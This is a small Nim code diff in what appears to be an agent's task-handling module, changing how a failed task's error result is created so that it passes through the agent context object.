@@ -9,7 +9,7 @@ proc handleTask*(ctx: AgentCtx, task: Task): TaskResult =
     try: 
         return commands[cast[CommandType](task.command)](ctx, task)
     except CatchableError as err: 
-        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 proc deserializeTask*(ctx: AgentCtx, bytes: seq[byte]): Task = 
     var unpacker = Unpacker.init(Bytes.toString(bytes))
